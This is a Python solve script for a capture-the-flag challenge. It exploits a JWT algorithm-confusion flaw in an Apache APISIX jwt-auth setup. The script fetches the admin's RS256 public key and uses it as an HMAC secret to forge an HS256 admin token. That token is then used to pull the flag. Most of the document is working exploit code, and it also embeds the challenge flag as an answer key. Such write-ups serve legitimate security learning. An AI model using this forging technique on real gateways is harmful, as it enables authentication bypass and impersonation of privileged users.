#!/usr/bin/env python3
"""
题目 1 · 错位的签名 (APISIX JWT Algorithm Confusion, CVE-2026-39999)
=====================================================================
目标: Apache APISIX 3.16.0 + jwt-auth 插件, Consumer `admin` 配置 algorithm=RS256
      + public_key。APISIX 3.16.0 新增的 apisix/plugins/jwt-auth/parser.lua
      在 verify_signature() 中使用 **JWT header 里攻击者可控的 alg** 选择验签算法,
      而密钥却由 **Consumer 配置的 algorithm**(RS256) 决定 -> 返回 public_key。
      于是构造 header {"alg":"HS256"} 并用该 RS256 公钥做 HMAC-SHA256 密钥签名,
      即可通过验签，实现任意用户(admin)身份伪造。

利用链:
  1. POST /login  guest:guest123  -> 得到 Flask session (普通用户入口)
  2. GET  /public-key             -> 拿到 admin 的 RS256 公钥 PEM (公钥本来就是公开的)
  3. 伪造 HS256 JWT: key=admin, role=admin, 密钥 = 公钥 PEM 字节(无结尾换行)
  4. GET  /flag  (Authorization: Bearer <伪造 token>, 也支持 ?jwt=)
     -> APISIX jwt-auth 验签通过 -> 后端按 admin 身份返回 flag

flag: 0xGame{6ef4193d-672d-4d0b-b420-528761a926bc}

依赖: 仅标准库 (hmac/hashlib/base64/json/urllib)
用法: python3 scripts/1-solve.py [target_url]
"""
import base64
import hashlib
import hmac
import json
import re
import sys
import time
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else \
    "http://9080-6cfc0691-c3d0-49e0-92ba-bc121ffe3608.challenge.ctfplus.cn"

# 从 /public-key 页面抓到的 admin RS256 公钥（去掉 </pre> 尾部换行即为 HMAC 密钥）
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA79XYBopfnVMKxI533oU2
VFQbEdSPtWRD+xSl73lHLVboGP1lSIZtnEj5AcTN2uDW6AYPiWL2iA3lEEsDTs7J
BUXyl6pysBPfrqC8n/MOXKaD4e8U5GAHFiwHWg2WzHlfFSlFkLjzp0vPkDK+fQ4C
lrd7shAyitB7use6DHcVCKuI4bFOoFbdI5sBGeyoD833g+ql9bRkH/vf8O+rPwHA
M+47r1iv3lY3ex0P45PRd7U7rq8P8UIw6qOI1tiYuKlFJmjFdcwtYG0dctxWwgL1
+7njrVQoWvuOTSsc9TDMhZkmmSsU3wXjaPxJpydck1C/w9ZLqsctKK5swYWhIcbc
BQIDAQAB
-----END PUBLIC KEY-----"""


def b64url(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def forge_hs256(key_material: bytes, claims: dict) -> str:
    """HS256 签名：密钥用 RS256 公钥字节（算法混淆的核心）。"""
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"},
                               separators=(",", ":")).encode())
    payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = b64url(hmac.new(key_material, signing_input, hashlib.sha256).digest())
    return (signing_input + b"." + sig).decode()


def http(url: str, data: bytes | None = None,
         headers: dict | None = None) -> tuple[int, bytes]:
    req = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main() -> int:
    # --- 1. 以 guest 身份登录（仅为走完普通用户流程 / 证明只有普通权限） ---
    code, _ = http(TARGET + "/login",
                   data=b"username=guest&password=guest123",
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(f"[*] /login guest:guest123 -> {code}")

    # --- 2. 公钥是公开的 ---
    code, body = http(TARGET + "/public-key")
    print(f"[*] /public-key -> {code}")
    m = re.search(rb"-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----",
                  body, re.S)
    pub = m.group(0).decode() if m else PUBLIC_KEY
    if pub != PUBLIC_KEY:
        print("[!] 服务器公钥与脚本内置不同，使用服务器返回的实时公钥")

    # --- 3. 算法混淆伪造 admin token ---
    now = int(time.time())
    token = forge_hs256(pub.encode(), {
        "key": "admin", "role": "admin", "sub": "admin",
        "exp": now + 86400, "nbf": now - 10,
    })
    print(f"[*] forged HS256(+RS256 pubkey) token for admin, {len(token)} bytes")

    # --- 4. 访问受保护路由 ---
    code, body = http(TARGET + "/flag", headers={"Authorization": "Bearer " + token})
    print(f"[*] /flag -> {code}")
    text = body.decode(errors="replace")
    flag = re.search(r"(?:0xGame|flag|FLAG)\{[^}]*\}", text)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")
        return 0
    print(text[:800])
    return 1


if __name__ == "__main__":
    sys.exit(main())
